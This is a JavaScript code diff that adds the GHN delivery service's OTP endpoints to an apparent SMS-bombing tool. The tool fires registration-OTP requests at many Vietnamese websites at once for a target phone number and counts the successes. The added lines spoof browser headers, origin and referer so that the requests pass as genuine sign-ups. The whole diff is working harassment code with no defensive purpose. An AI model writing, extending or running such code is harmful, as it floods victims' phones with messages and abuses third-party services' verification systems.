@@ -663,6 +663,42 @@ const payload = {
     };
 
     const batdongsanUrl = `https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=${phone}`;
+
+    const onlineHeaders = {
+        'authority': 'online-gateway.ghn.vn',
+        'accept': '*/*',
+        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'access-control-request-headers': 'content-type',
+        'access-control-request-method': 'POST',
+        'origin': 'https://sso.ghn.vn',
+        'referer': 'https://sso.ghn.vn/',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    };
+
+    const ghnHeaders = {
+      'authority': 'online-gateway.ghn.vn',
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+        'content-type': 'application/json',
+        'dnt': '1',
+        'origin': 'https://sso.ghn.vn',
+        'referer': 'https://sso.ghn.vn/',
+        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    };
+
+    const ghnData = {
+      'phone': phone,
+        'type': 'register',
+    };
             
 
     // Initial message to be edited later
@@ -742,6 +778,8 @@ const payload = {
         axios.post('https://id.icankid.vn/api/otp/challenge/', idJsonData, { headers: idHeaders , cookies: idCookies }), 
         axios.post('https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone', thitruongsiData, { headers: thitruongsiHeaders, cookies: thitruongsiCookies }), 
         axios.post(batdongsanUrl), 
+        axios.options('https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone', { headers: onlineHeaders }), 
+        axios.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', ghnData, { headers: ghnHeaders }), 
         ])
       .then(() => {
         successCount += 22;
